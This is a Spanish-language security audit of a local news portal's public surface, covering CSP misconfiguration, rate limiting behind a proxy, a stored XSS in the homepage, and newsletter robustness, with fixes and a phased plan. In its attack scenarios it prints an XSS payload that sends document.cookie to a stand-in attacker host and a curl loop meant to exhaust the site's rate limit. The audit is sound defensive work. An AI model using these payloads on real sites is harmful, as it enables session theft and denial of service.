# Auditoría de la superficie pública — CREA Command Center

**Fecha:** 7 de julio de 2026
**Alcance:** portal editorial público (`apps/web/*.html` + `assets/`), API pública de solo lectura (`apps/api/src/modules/public/`), rutas sociales públicas (`modules/social`), Estudio (`apps/web/estudio/`), formulario de leads, newsletter completo (módulo, cron, plantilla, Resend, migraciones 018–021) y flujo de podcast/ElevenLabs.
**Método:** lectura directa del código de cada archivo del alcance, incluyendo las versiones instaladas de `helmet` (7.2.0) y `express-rate-limit` (8.5.2). Nada especulativo: cada hallazgo cita archivo y línea.

---

## Resumen ejecutivo

La superficie pública está, en general, bien construida: todos los endpoints de artículos filtran por `status='published'`, el contenido generado por IA se escapa antes de tocar el DOM y el correo, las bajas del newsletter las maneja Resend con sus propios tokens, y no existe ninguna ruta pública que pueda disparar generación de audio en ElevenLabs (cero riesgo de quemar esa cuota desde internet). No se encontró ningún hallazgo crítico de fuga de datos.

Los problemas grandes son de otra naturaleza: (1) la política de seguridad de contenido (CSP) que Helmet aplica por defecto **rompe funcionalidad visible del portal en producción** — clima, miniaturas de video, todos los embeds de TikTok/YouTube/Facebook y dos scripts inline; (2) el rate limiting **no distingue visitantes** detrás del proxy de Dokploy, así que un solo atacante puede agotar el límite global y dejar el portal y el formulario de contacto fuera de servicio para todos; (3) hay **un punto de XSS real** en la portada donde una miniatura externa se inyecta sin escapar; y (4) el formulario de suscripción al newsletter **es invisible en móvil**, que es donde está la audiencia.

Ninguno de estos requiere rediseño: son correcciones puntuales de configuración y de pocas líneas.

---

## Tabla de hallazgos

| ID | Severidad | Área | Archivo:línea | Descripción | Solución |
|----|-----------|------|---------------|-------------|----------|
| A1 | Alta | Portal | `apps/api/src/server.js:27` | CSP por defecto de Helmet bloquea en producción: fetch a open-meteo (clima), imágenes externas (miniaturas oEmbed), todos los iframes de embeds, `tiktok.com/embed.js` y los scripts inline de `index.html` y `producciones.html` | CSP a medida con `connect-src`, `img-src`, `frame-src` y hashes/archivos externos para los scripts |
| A2 | Alta | Portal/Estudio | `apps/api/src/server.js` (falta `trust proxy`), `modules/public/index.js:9,141,210` | Detrás del proxy (Dokploy/Traefik) todas las requests comparten la IP del proxy: los límites 300/15min y 5/15min son **globales**, no por visitante → DoS trivial del portal y del formulario de leads | `app.set('trust proxy', 1)` |
| A3 | Alta | Portal | `apps/web/index.html:188` | `thumbnail_url` (viene de oEmbed externo vía DB) se inyecta en `innerHTML` **sin escapar** — XSS almacenado en portada | Usar `esc()` como en `producciones.html:122` |
| A4 | Alta | Newsletter | `apps/web/index.html:20-35` | El único formulario de suscripción del sitio vive dentro de `<span class="desktop-only">` → invisible bajo 900px; la audiencia móvil no puede suscribirse | Añadir el form al menú móvil y/o a `comunidad.html` |
| M1 | Media | Portal | `apps/api/src/modules/social/index.js:141,164` | `/api/public/social*` está montado en `/api` (server.js:56), fuera del rate limiter público; además cada `GET /embed` anónimo ejecuta un `UPDATE` a la BD (líneas 179-187) | Añadir rate limiter al router social público; refrescar oEmbed solo si `fetched_at` es viejo |
| M2 | Media | Portal | `apps/api/src/modules/public/index.js:65-76` | `POST /articles/:slug/view` sin dedupe: cualquiera infla `view_count` en loop y manipula "Lo más leído" (300 vistas/15min con A2 sin arreglar; ilimitado por IP botnet) | Dedupe simple (IP+slug en memoria/tabla, TTL 1h) o aceptar el riesgo documentado |
| M3 | Media | Newsletter | `apps/api/src/modules/public/index.js:213-227` | Alta directa sin doble opt-in: se puede suscribir el correo de un tercero (acoso, contaminación de la audiencia de Resend, reputación de spam) | Doble opt-in: email de confirmación con token antes de `addContact` |
| M4 | Media | Newsletter | `apps/api/src/modules/newsletter/index.js:76-95`, `lib/resend-client.js:46-58` | `/send` no verifica que la edición ya esté `enviado` → dos clics = dos broadcasts al total de suscriptores. `sendBroadcast` es create+send sin idempotencia: un timeout en el segundo paso más un reintento duplica el envío | Guard por status + registrar `broadcast.id` antes del send |
| M5 | Media | Newsletter | `apps/api/src/lib/newsletter-cron.js:34-37` | El cron solo dispara en el minuto exacto configurado: si Perplexity/Claude falla o el proceso está reiniciando en ese minuto, no hay edición ese día (sin retry) | Cambiar condición a "ya pasó la hora y no existe edición de hoy" |
| M6 | Media | Newsletter | `apps/api/src/lib/resend-client.js:38-42` | `countActiveSubscribers` lee una sola página de contactos de Resend; al crecer la lista el conteo del panel será incorrecto | Paginar con el cursor de Resend |
| M7 | Media | API | `apps/api/src/config/index.js:4-7`, `server.js:30` | `CORS_ORIGIN` vacío en producción solo emite un warn y deja CORS reflejando cualquier origen | Fail-hard en producción (throw) o default a `PUBLIC_SITE_URL` |
| M8 | Media | Portal/Estudio | `apps/web/*.html` (heads) | Solo `nota.html` tiene Open Graph (bien resuelto con SSR); el resto de páginas no tiene `og:*`, no hay `og:image` por defecto, no hay JSON-LD `NewsArticle`, ni `sitemap.xml`/`robots.txt` | OG básico + imagen default en todas las páginas; sitemap generado desde la BD |
| M9 | Media | Portal | `apps/api/src/modules/public/index.js:232-244` | Cada request de imagen lee el BYTEA completo de Postgres; sin `ETag`/304 ni caché intermedia, un pico de tráfico traduce cada visitante nuevo en megas leídos de la BD | `ETag: id` + responder 304; a futuro, proxy caché o disco |
| B1 | Baja | Estudio | `apps/api/src/modules/public/index.js:95` | `SELECT *` en site-metrics expone columnas de más si la tabla crece | Listar columnas explícitas |
| B2 | Baja | Portal | `apps/web/*.html` | Sin `<noscript>`: sin JavaScript el portal queda en blanco (los crawlers de FB/WhatsApp ya están cubiertos por el SSR de nota) | `<noscript>` con mensaje y enlace |
| B3 | Baja | Newsletter | `apps/api/src/lib/newsletter-template.js` | Correo sólido (tablas, estilos inline, texto alternativo, unsubscribe visible ✓). Falta preheader oculto; `border-radius` se ignora en Outlook (cosmético) | Añadir `<div style="display:none">` con resumen del día |
| B4 | Baja | Newsletter | `apps/api/src/lib/newsletter-content.js:25-33` | `website_url` del patrocinador va al `href` del correo sin validar esquema (`javascript:` no aplica en email, pero un typo produce link roto ante 1K+ lectores) | Validar `^https?://` al capturar el cliente |
| B5 | Baja | Podcast | `apps/api/src/modules/newsletter/index.js:15-19,99` | `aiLimiter` permite 30 TTS/15min por usuario autenticado: una cuenta de staff comprometida puede quemar cuota de ElevenLabs rápido | Bajar el límite de `/audio` a ~5/15min |

**Verificado sin hallazgo (lo que se pidió revisar y está bien):**

- **Filtrado de publicados**: los 6 endpoints de lectura de artículos/autores filtran `status='published'`; `ARTICLE_FIELDS` es una allowlist explícita que nunca expone `image_prompt`, `topic_id` ni columnas internas (`public/index.js:12`). El SSR de nota también filtra por published (`nota-ssr.js:49`).
- **XSS en el resto del portal**: `main.js`, `producciones.html` y la plantilla del correo escapan todo el contenido de BD/IA con `esc()`; el único punto sin escapar es A3. El `embed_html` que se inyecta crudo se construye 100% server-side a partir de IDs extraídos por regex, con el título escapado (`social/index.js:79-105`).
- **Newsletter**: los tokens de unsubscribe los genera y valida Resend (`{{{RESEND_UNSUBSCRIBE_URL}}}` por destinatario) — no son adivinables ni permiten dar de baja a terceros. **No existen endpoints propios de tracking open/click** (la tabla `newsletter_events` de la migración 020 es la agenda de eventos del pueblo, no tracking); las métricas de apertura viven en Resend. La API key de Resend solo se usa server-side.
- **Podcast/ElevenLabs**: `POST /api/newsletter/audio` exige JWT + rol director/produccion + rate limit. No hay audios almacenados ni URLs públicas de audio; "Tercer Tiempo" público son videos de Facebook embebidos. Un anónimo no puede gastar un centavo de ElevenLabs.
- **Enumeración/IDOR**: slugs solo resuelven si published; ediciones del newsletter no tienen ninguna ruta pública; `generated_images` usa UUID v4 (`gen_random_uuid()`), no enumerable.
- **Leads**: validación con allowlist de campos y longitudes máximas en la frontera, SQL 100% parametrizado, honeypot con respuesta indistinguible, y el panel admin escapa nombre/empresa/mensaje al renderizar (`panel.js:1008-1011`). El dato del lead no se refleja en ningún correo hoy.
- **Cron**: lock en memoria + `ON CONFLICT DO NOTHING` + constraint `UNIQUE(edition_date)` → no hay doble generación ni doble costo de API; el cron nunca envía, solo genera (gate humano intacto).
- **Responsive**: CSS mobile-first real (grids colapsan a 1 columna, nav con `overflow-x`, menú hamburguesa en todas las páginas, breakpoints 640/768/900). La excepción es A4.
- **Accesibilidad**: labels en todos los campos, `aria-live` + focus en mensajes de formulario, `aria-expanded` en el menú, `visually-hidden` correcto, contraste corregido a AA (`--text-mute` oscurecido, documentado en tokens.css).

---

## Detalle de hallazgos Altos

### A1 — La CSP por defecto de Helmet rompe el portal en producción

`server.js:27` aplica `helmet()` sin opciones **antes** de los estáticos (orden correcto para que el HTML lleve headers). Pero Helmet 7 emite esta CSP por defecto:

```
default-src 'self'; script-src 'self'; script-src-attr 'none';
img-src 'self' data:; style-src 'self' https: 'unsafe-inline';
font-src 'self' https: data:; object-src 'none'; ...
```

Como `connect-src` y `frame-src` no están definidos, heredan `default-src 'self'`. En producción (el API sirve `apps/web/`), el navegador bloquea:

| Recurso | Directiva que lo bloquea | Efecto visible |
|---|---|---|
| `fetch` a `api.open-meteo.com` (`main.js:603`) | `connect-src 'self'` | Clima del topbar nunca aparece |
| Miniaturas oEmbed (CDN de TikTok/YouTube) | `img-src 'self' data:` | Tarjetas de Producciones y Tercer Tiempo sin imagen |
| Iframes de TikTok/YouTube/Facebook (`social/index.js:84,90,98`) | `frame-src → default-src 'self'` | **Ningún embed reproduce**: producciones.html, tercer-tiempo.html y la promo de portada quedan muertos |
| `https://www.tiktok.com/embed.js` (`producciones.html:91`) | `script-src 'self'` | Blockquotes de TikTok nunca se convierten en player |
| Scripts inline (`index.html:178`, `producciones.html:92`) | `script-src 'self'` | Preview de producciones en portada y lógica de la página de producciones no ejecutan |

**Escenario de fallo:** no hace falta atacante — el visitante normal en producción ve el portal sin clima, sin videos y sin previews. Y la "solución" tentadora (`helmet({ contentSecurityPolicy: false })`) dejaría el sitio sin CSP justo cuando A3 demuestra que hay vectores de inyección reales.

**Solución** (en `server.js`):

```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      'connect-src': ["'self'", 'https://api.open-meteo.com'],
      'img-src': ["'self'", 'data:', 'https:'], // miniaturas oEmbed vienen de CDNs variables
      'frame-src': ['https://www.tiktok.com', 'https://www.youtube.com', 'https://www.facebook.com'],
      'script-src': ["'self'", 'https://www.tiktok.com'],
    },
  },
}));
```

y mover los dos scripts inline (`index.html:178-194`, `producciones.html:92+`) a archivos en `assets/js/` (mejor que abrir `'unsafe-inline'`).

### A2 — `trust proxy` sin configurar: rate limits globales = DoS barato

No hay ningún `app.set('trust proxy', ...)` en el código. En producción el API corre detrás del proxy de Dokploy/Traefik, así que `req.ip` es siempre la IP del proxy (express-rate-limit 8.5.2 detecta el `X-Forwarded-For` inesperado y lo **loguea** — `logger.error`, no rompe la request — pero sigue usando la IP del socket).

**Consecuencia:** los tres limiters por IP (`public/index.js:9` 300/15min, `:141` leads 5/15min, `:210` newsletter 5/15min) se convierten en **contadores globales compartidos por todos los visitantes**.

**Escenario de ataque:** un script con `for i in $(seq 300); do curl https://crea-contenidos.com/api/public/articles; done` cada 15 minutos deja la portada, secciones, notas y Estudio respondiendo 429 **para todo el público**. Peor aún sin atacante: 6 personas legítimas que envían el formulario de contacto en la misma ventana de 15 minutos bloquean el formulario para el resto (5/15min globales) — leads comerciales perdidos silenciosamente.

**Solución** (una línea en `server.js`, antes de los routers):

```js
app.set('trust proxy', 1); // un hop: Traefik de Dokploy
```

Con eso `req.ip` vuelve a ser la IP real del visitante y los límites funcionan como se diseñaron.

### A3 — XSS en portada: `thumbnail_url` sin escapar

`index.html:186-189`:

```js
preview.innerHTML = posts.map(function (p) {
  return '<a href="producciones.html" ...>' +
    (p.thumbnail_url ? '<img src="' + p.thumbnail_url + '" alt="" ...>' : ...) +
```

`thumbnail_url` viene de las respuestas oEmbed de TikTok/Facebook (`social/index.js:64`) y se guarda en BD sin sanitizar — es dato externo no confiable que además **se refresca automáticamente en cada request pública de embed** (`social/index.js:179-187`), es decir, un oEmbed manipulado puede reescribirlo sin que ningún editor lo toque.

**Escenario de ataque:** un `thumbnail_url` con valor `x" onerror="fetch('https://evil.tld/'+document.cookie)` cierra el atributo `src` e inyecta un handler en la portada del medio. Hoy la CSP default (`script-src-attr 'none'`) frena la ejecución — pero ese mismo script inline está bloqueado por la CSP, y el arreglo de A1 va a reactivarlo; si la CSP se relaja mal, esto se vuelve XSS ejecutable. El resto del sitio ya lo hace bien (`producciones.html:122` usa `esc()`).

**Solución:** al mover este script a `assets/js/` (por A1), usar el `esc()` de main.js:

```js
'<img src="' + esc(p.thumbnail_url) + '" alt="" ...>'
```

### A4 — Suscripción al newsletter invisible en móvil

El único `form[data-newsletter-form]` de todo el sitio está en `index.html:20-35`, dentro de `<span class="weather desktop-only">`. `style.css:229` define `.desktop-only { display: none !important; }` bajo 900px. El menú móvil (`index.html:65-79`) no incluye ni el formulario ni un enlace a suscribirse, y `comunidad.html` tampoco tiene formulario de newsletter (solo el de ideas).

**Escenario de fallo:** el medio vive de compartirse por WhatsApp/Facebook → el tráfico es abrumadoramente móvil → **prácticamente ningún lector puede suscribirse a "Buenos días, Perote"**. El producto estrella del newsletter crece solo con las (pocas) visitas desktop.

**Solución:** añadir el mismo `<form data-newsletter-form>` (main.js ya lo inicializa por selector) dentro de `.mobile-menu` y como bloque al final de `comunidad.html` y de `nota.html` (el mejor momento para pedir la suscripción es después de leer una nota).

---

## Notas de robustez (Medias, resumen)

- **M4 (doble envío)**: el guard es un `WHERE status != 'enviado'` en el UPDATE + verificar `rowCount` antes de llamar a `sendBroadcast`, o consultar el status primero. Hoy dos directores (o un doble clic con latencia) mandan el correo dos veces a toda la lista — el tipo de error que quema la confianza de los suscriptores.
- **M5 (cron sin retry)**: cambiar `hour !== send_hour || minute !== send_minute` por "hora actual ≥ hora configurada y no existe edición de hoy" hace el cron autocorrectivo ante caídas — sin tocar el diseño de gate humano.
- **M1 (social)**: además del rate limit, condicionar el refresh de oEmbed a `fetched_at < now() - interval '6 hours'` elimina un UPDATE por cada visita anónima a producciones/portada/tercer-tiempo (hoy: 3 páginas × N posts × cada visitante = escrituras constantes).

---

## Plan de implementación en fases

**Fase 1 — Configuración de producción (una sesión, sin riesgo):** A2 (`trust proxy`, 1 línea), M7 (CORS fail-hard), B1 (columnas explícitas). Son las correcciones más baratas y A2 es la que hoy deja al portal expuesto a un DoS trivial y con límites de leads rotos.

**Fase 2 — CSP + XSS (van juntas obligatoriamente):** A1 y A3. Primero mover los dos scripts inline a `assets/js/` escapando `thumbnail_url`, luego la CSP a medida. Hacerlas juntas evita la ventana en la que relajar la CSP expondría el XSS. Verificar en producción: clima visible, embeds reproduciendo, consola sin violaciones CSP.

**Fase 3 — Newsletter confiable antes de que crezca la lista:** A4 (formulario en móvil — desbloquea el crecimiento), M4 (guard de doble envío — el fallo más costoso en reputación), M3 (doble opt-in), M5 (cron autocorrectivo), M6 (conteo paginado), B3/B4 (preheader, validar URL de patrocinador). Este orden: primero que nadie reciba correo duplicado o no pedido, después crecer.

**Fase 4 — Escala y alcance:** M1, M2, M9 (caché/ETag de imágenes), M8 (OG + sitemap + JSON-LD — directamente ligado a distribución en Facebook/WhatsApp), B2, B5. Ninguna es urgente al tráfico actual; M8 es la de mayor retorno editorial.
